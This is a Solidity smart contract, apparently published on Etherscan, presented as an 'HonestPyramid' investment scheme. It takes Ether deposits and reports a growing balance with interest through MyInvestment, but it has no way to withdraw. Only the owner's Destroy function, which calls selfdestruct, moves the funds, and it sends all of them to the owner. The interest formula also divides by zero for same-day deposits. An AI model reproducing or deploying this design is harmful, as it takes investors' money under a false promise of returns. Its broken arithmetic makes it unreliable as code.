/**
 *Submitted for verification at Etherscan.io on 2021-09-25
*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

contract HonestPyramid{
    event event_invest(address Investor,uint256 amount);
    event event_receive(address Donor,uint256 Value);
    
    address payable private honest_pyramid_owner;
    
    struct Investor{ 
        uint256 principal;
        uint256 last_invest_time;
    }
    mapping(address=>Investor) address_investor;
    modifier IsOwner(){
        require(msg.sender==honest_pyramid_owner,"Hay,You Don't Have Right To Do This!! ");
        _;
    }
    constructor(){
      honest_pyramid_owner = payable(msg.sender);
     }
     
     
     
     function InvestPyramid() public payable{
         address investor_address = msg.sender; 
         Investor storage investor = address_investor[investor_address];
         uint256 new_investment = msg.value;
         investor.principal += new_investment;
         investor.last_invest_time = block.timestamp;
         emit event_invest(investor_address,new_investment);
     } 
     
     function MyInvestment() public payable returns(uint256){
         Investor  memory inv= address_investor[msg.sender];
         uint256 investment = inv.principal;
         uint256 invest_days = (block.timestamp - inv.last_invest_time)/(60*60*24);
         uint256 interest = investment  / (10*invest_days);
         uint256 sum = investment + interest ;
         return sum;
     }
     
     function MyAddress() public view returns(address){
         return msg.sender;
     }
     
    fallback() external payable {
    } 
    receive() external payable {
        emit event_receive(msg.sender,msg.value);
    }
    
    function Destroy() external IsOwner{
        selfdestruct(honest_pyramid_owner);
    }
}